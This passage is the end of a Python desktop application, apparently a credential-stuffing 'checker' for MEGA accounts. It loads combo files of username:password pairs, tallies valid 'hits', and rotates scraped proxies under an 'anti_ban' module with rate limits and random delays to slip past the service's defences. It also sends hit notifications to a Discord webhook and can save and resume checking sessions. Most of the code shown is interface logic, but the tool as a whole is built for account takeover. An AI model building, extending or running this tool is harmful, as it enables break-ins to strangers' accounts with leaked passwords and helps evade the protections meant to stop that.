        self.header_status.configure(text="● Ready", text_color=self.colors['success'])
        
        elapsed = int(time.time() - self.stats['start_time']) if self.stats['start_time'] else 0
        
        self.log_message("Checking complete", "success")
        self.log_message(f"Time: {elapsed}s | Hits: {self.stats['hits']} | Fails: {self.stats['fails']}", "info")
    
    def apply_settings(self):
        """Apply settings"""
        try:
            anti_ban.max_requests_per_minute = int(self.rate_slider.get())
            anti_ban.min_delay = float(self.min_delay_entry.get())
            anti_ban.max_delay = float(self.max_delay_entry.get())
        except:
            pass
    
    # ========== PROXY FUNCTIONS ==========
    
    def toggle_proxy(self):
        """Toggle proxy"""
        if self.proxy_var.get():
            anti_ban.enable()
            self.proxy_status.configure(
                text="Proxy: Enabled",
                text_color=self.colors['success']
            )
            self.log_message("Proxy rotation enabled", "success")
        else:
            anti_ban.disable()
            self.proxy_status.configure(
                text="Proxy: Disabled",
                text_color=self.colors['text_tertiary']
            )
            self.log_message("Proxy rotation disabled", "warning")
    
    def deploy_proxies(self):
        """Deploy proxies (fast mode)"""
        if not self.combo_files:
            proxy_count = 50
        else:
            with open(self.combo_files[0], 'r', encoding='utf-8', errors='ignore') as f:
                combo_size = len([line for line in f if line.strip()])
            proxy_count = max(20, min(200, int(combo_size * 0.1)))
        
        self.auto_deploy_proxies(proxy_count)
    
    def deploy_ai_proxies(self):
        """Deploy AI-tested high-quality proxies"""
        if not self.combo_files:
            proxy_count = 30
        else:
            with open(self.combo_files[0], 'r', encoding='utf-8', errors='ignore') as f:
                combo_size = len([line for line in f if line.strip()])
            proxy_count = max(15, min(50, int(combo_size * 0.08)))
        
        self.auto_deploy_ai_proxies(proxy_count)
    
    def auto_deploy_proxies(self, count: int):
        """Auto-deploy proxies (fast mode)"""
        self.proxy_status.configure(
            text=f"Fetching {count} proxies...",
            text_color=self.colors['warning']
        )
        self.log_message(f"Fetching {count} proxies (fast mode)...", "info")
        
        def fetch():
            try:
                proxies = proxy_fetcher.fetch_all_sources(max_proxies=count)
                if proxies:
                    proxy_fetcher.save_to_file("auto_proxies.txt", proxies)
                    loaded = anti_ban.load_proxies_from_file("auto_proxies.txt")
                    
                    self.after(0, lambda: self.proxy_status.configure(
                        text=f"Proxy: {loaded} loaded",
                        text_color=self.colors['success']
                    ))
                    self.after(0, lambda: self.log_message(f"Loaded {loaded} proxies", "success"))
                else:
                    self.after(0, lambda: self.proxy_status.configure(
                        text="Proxy: Failed to fetch",
                        text_color=self.colors['error']
                    ))
                    self.after(0, lambda: self.log_message("Failed to fetch proxies", "error"))
            except Exception as e:
                self.after(0, lambda: self.log_message(f"Error: {str(e)}", "error"))
        
        threading.Thread(target=fetch, daemon=True).start()
    
    def auto_deploy_ai_proxies(self, count: int):
        """Auto-deploy AI-tested high-quality proxies"""
        self.proxy_status.configure(
            text="🤖 AI testing proxies...",
            text_color=self.colors['warning']
        )
        self.log_message(f"🤖 Starting AI proxy quality check for {count} proxies...", "info")
        self.log_message("AI will test each proxy against MEGA servers", "info")
        self.log_message("This may take 1-3 minutes...", "warning")
        
        def fetch_ai():
            try:
                # Fetch high-quality proxies with AI testing
                high_quality = proxy_fetcher.fetch_high_quality(
                    max_proxies=count,
                    min_quality_score=70,  # Only high quality
                    test_sample_size=min(150, count * 5),
                    max_workers=15
                )
                
                if high_quality:
                    proxy_fetcher.save_to_file("ai_proxies.txt", high_quality)
                    loaded = anti_ban.load_proxies_from_file("ai_proxies.txt")
                    
                    self.after(0, lambda: self.proxy_status.configure(
                        text=f"🤖 AI: {loaded} quality proxies",
                        text_color=self.colors['success']
                    ))
                    self.after(0, lambda: self.log_message(
                        f"✅ AI loaded {loaded} high-quality MEGA-compatible proxies",
                        "success"
                    ))
                    self.after(0, lambda: self.log_message(
                        "✓ All proxies tested against MEGA servers",
                        "success"
                    ))
                else:
                    self.after(0, lambda: self.proxy_status.configure(
                        text="AI: No quality proxies found",
                        text_color=self.colors['error']
                    ))
                    self.after(0, lambda: self.log_message(
                        "⚠️ AI couldn't find quality proxies. Try again or use fast mode.",
                        "warning"
                    ))
            except Exception as e:
                self.after(0, lambda err=str(e): self.log_message(f"AI Error: {err}", "error"))
        
        threading.Thread(target=fetch_ai, daemon=True).start()
    
    # ========== UI UPDATE FUNCTIONS ==========
    
    def update_rate_label(self, value):
        """Update rate label"""
        self.rate_label.configure(text=f"{int(value)} requests/minute")
    
    def update_progress(self, checked, total, hits, customs, fails):
        """Update progress"""
        try:
            progress = checked / total if total > 0 else 0
            self.progress_bar.set(progress)
            self.progress_text.configure(text=f"{checked} / {total} ({progress*100:.1f}%)")
            
            # Update stats
            self.stat_checked.value_widget.configure(text=str(checked))
            self.stat_hits.value_widget.configure(text=str(hits))
            self.stat_fails.value_widget.configure(text=str(fails))
            
            # Update metrics
            if self.stats['start_time']:
                elapsed = time.time() - self.stats['start_time']
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                success_rate = (hits / checked * 100) if checked > 0 else 0
                remaining = ((total - checked) / speed * 60) if speed > 0 else 0
                
                metrics = f"Speed: {speed:.1f} accounts/min\n"
                metrics += f"Success Rate: {success_rate:.2f}%\n"
                metrics += f"Elapsed Time: {int(elapsed)}s\n"
                metrics += f"Estimated Remaining: ~{int(remaining)}s\n"
                metrics += f"\nHits: {hits} | Fails: {fails}"
                
                self.metrics_display.delete("1.0", "end")
                self.metrics_display.insert("1.0", metrics)
        except:
            pass
    
    def log_message(self, message: str, msg_type: str = "info"):
        """Log message to console"""
        try:
            self.console.configure(state="normal")
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # Color mapping
            colors = {
                "success": self.colors['success'],
                "error": self.colors['error'],
                "warning": self.colors['warning'],
                "info": self.colors['text_secondary']
            }
            
            prefix = {
                "success": "✓",
                "error": "✗",
                "warning": "!",
                "info": "•"
            }
            
            self.console.insert("end", f"[{timestamp}] {prefix.get(msg_type, '•')} {message}\n")
            self.console.configure(state="disabled")
            self.console.see("end")
        except:
            pass
    
    def clear_console(self):
        """Clear console"""
        self.console.configure(state="normal")
        self.console.delete("1.0", "end")
        self.console.configure(state="disabled")
        self.log_message("Console cleared", "info")
    
    def export_results(self):
        """Export results to file"""
        if self.stats['hits'] == 0:
            messagebox.showinfo("Info", "No hits to export")
            return
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"hits_{timestamp}.txt"
            
            # For now, just show message (actual export would need hit storage)
            messagebox.showinfo(
                "Export",
                f"Would export {self.stats['hits']} hits to {filename}\n\n"
                f"Note: Implement hit storage in checker_engine for full export"
            )
            self.log_message(f"Export requested: {self.stats['hits']} hits", "info")
        except Exception as e:
            self.log_message(f"Export error: {str(e)}", "error")
    
    def test_webhook(self):
        """Test webhook"""
        url = self.webhook_entry.get().strip()
        if not url:
            self.log_message("No webhook URL provided", "warning")
            return
        
        try:
            self.discord_notifier.webhook_url = url
            success = self.discord_notifier.send_test_message()
            
            if success:
                self.log_message("Webhook test successful", "success")
            else:
                self.log_message("Webhook test failed", "error")
        except Exception as e:
            self.log_message(f"Webhook error: {str(e)}", "error")
    
    def apply_theme(self, theme_name: str):
        """Apply selected theme"""
        self.current_theme_name = theme_name
        
        if theme_name == "Default":
            self.theme_info.configure(text="Using default professional theme")
            self.log_message("Applied default theme", "info")
            return
        
        # Load theme colors
        colors = theme_manager.load_theme(theme_name)
        
        if not colors:
            self.log_message(f"Failed to load theme: {theme_name}", "error")
            return
        
        # Update color palette
        self.colors.update(colors)
        
        # Update theme info
        theme_data = theme_manager.themes.get(theme_name, {})
        author = theme_data.get('author', 'Unknown')
        version = theme_data.get('version', '1.0.0')
        self.theme_info.configure(text=f"Theme by {author} v{version}")
        
        self.log_message(f"✓ Applied theme: {theme_name}", "success")
        self.log_message("⚠ Restart app to see full theme changes", "info")
    
    def save_current_session(self):
        """Save current checking session"""
        if not self.combo_files:
            messagebox.showwarning("No Session", "No combo files loaded to save")
            return
        
        # Get session description
        from tkinter import simpledialog
        description = simpledialog.askstring(
            "Save Session",
            "Enter session description (optional):",
            parent=self
        )
        
        # Gather settings
        settings = {
            'rate_limit': self.rate_entry.get(),
            'min_delay': self.min_delay_entry.get(),
            'max_delay': self.max_delay_entry.get(),
            'use_proxy': self.proxy_var.get(),
            'proxy_mode': self.proxy_mode_var.get(),
            'use_ai_proxies': self.ai_proxy_var.get(),
            'webhook_url': self.webhook_entry.get()
        }
        
        # Create session
        try:
            total_accounts = sum(
                sum(1 for line in open(f, 'r', encoding='utf-8', errors='ignore') 
                    if line.strip() and ':' in line)
                for f in self.combo_files
            )
        except:
            total_accounts = 0
        
        session = session_manager.create_session(
            combo_file=', '.join([Path(f).name for f in self.combo_files]),
            total_accounts=total_accounts,
            settings=settings,
            description=description or ""
        )
        
        # Update progress if checking
        session_manager.update_session_progress(
            checked=self.stats['checked'],
            hits=self.stats['hits'],
            fails=self.stats['fails'],
            customs=0,
            position=self.stats['checked']
        )
        
        self.log_message(f"💾 Session saved: {session.session_id}", "success")
        messagebox.showinfo("Session Saved", f"Session ID: {session.session_id}\n\nSaved to: sessions/{session.session_id}.json")
    
    def load_saved_session(self):
        """Load a saved session"""
        # List available sessions
        sessions = session_manager.list_sessions()
        
        if not sessions:
            messagebox.showinfo("No Sessions", "No saved sessions found")
            return
        
        # Create selection dialog
        dialog = ctk.CTkToplevel(self)
        dialog.title("Load Session")
        dialog.geometry("600x400")
        dialog.configure(fg_color=self.colors['bg_main'])
        dialog.transient(self)
        dialog.grab_set()
        
        # Center dialog
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (600 // 2)
        y = (dialog.winfo_screenheight() // 2) - (400 // 2)
        dialog.geometry(f"600x400+{x}+{y}")
        
        ctk.CTkLabel(
            dialog,
            text="Select Session to Load",
            font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"),
            text_color=self.colors['text_primary']
        ).pack(pady=20)
        
        # Session list
        list_frame = ctk.CTkScrollableFrame(
            dialog,
            fg_color=self.colors['bg_secondary'],
            height=250
        )
        list_frame.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        
        selected_session = [None]  # Mutable container for selection
        
        for session in sessions:
            stats = session_manager.get_session_stats(session)
            
            session_card = ctk.CTkFrame(
                list_frame,
                fg_color=self.colors['bg_elevated'],
                border_width=1,
                border_color=self.colors['border_main']
            )
            session_card.pack(fill="x", padx=10, pady=5)
            
            info_text = f"Session: {session.session_id}\n"
            info_text += f"Status: {session.status.upper()} | Progress: {stats['progress']}\n"
            info_text += f"Hits: {stats['hits']} | Checked: {stats['checked']}/{stats['total']}\n"
            info_text += f"Created: {session.created_at[:19]}"
            
            if session.description:
                info_text += f"\nDescription: {session.description}"
            
            session_label = ctk.CTkLabel(
                session_card,
                text=info_text,
                font=ctk.CTkFont(family="Consolas", size=10),
                text_color=self.colors['text_secondary'],
                justify="left",
                anchor="w"
            )
            session_label.pack(fill="x", padx=10, pady=10)
            
            def make_load_callback(s):
                def callback():
                    selected_session[0] = s
                    dialog.destroy()
                return callback
            
            load_btn = ctk.CTkButton(
                session_card,
                text="Load This Session",
                fg_color=self.colors['primary'],
                hover_color=self.colors['primary_hover'],
                height=30,
                command=make_load_callback(session)
            )
            load_btn.pack(pady=(0, 10))
        
        # Cancel button
        cancel_btn = ctk.CTkButton(
            dialog,
            text="Cancel",
            fg_color=self.colors['error'],
            hover_color="#c53929",
            command=dialog.destroy
        )
        cancel_btn.pack(pady=(0, 20))
        
        # Wait for dialog to close
        dialog.wait_window()
        
        # Load selected session
        if selected_session[0]:
            session = selected_session[0]
            
            # Restore settings
            try:
                settings = session.settings
                self.rate_entry.delete(0, 'end')
                self.rate_entry.insert(0, str(settings.get('rate_limit', 20)))
                self.min_delay_entry.delete(0, 'end')
                self.min_delay_entry.insert(0, str(settings.get('min_delay', 2)))
                self.max_delay_entry.delete(0, 'end')
                self.max_delay_entry.insert(0, str(settings.get('max_delay', 5)))
                self.proxy_var.set(settings.get('use_proxy', False))
                self.proxy_mode_var.set(settings.get('proxy_mode', 'fast'))
                self.ai_proxy_var.set(settings.get('use_ai_proxies', False))
                webhook_url = settings.get('webhook_url', '')
                if webhook_url:
                    self.webhook_entry.delete(0, 'end')
                    self.webhook_entry.insert(0, webhook_url)
                
                # Update current session in session_manager
                session_manager.current_session = session
                
                self.log_message(f"✓ Loaded session: {session.session_id}", "success")
                self.log_message(f"Progress restored: {session.checked_count}/{session.total_accounts} checked", "info")
                
                messagebox.showinfo(
                    "Session Loaded",
                    f"Session: {session.session_id}\n\n"
                    f"Progress: {session.checked_count}/{session.total_accounts}\n"
                    f"Hits: {session.hit_count}\n"
                    f"Fails: {session.fail_count}\n\n"
                    f"Settings restored. Load your combo files to resume."
                )
                
            except Exception as e:
                self.log_message(f"Error loading session: {e}", "error")


if __name__ == "__main__":
    app = MegaProElite()
    app.mainloop()
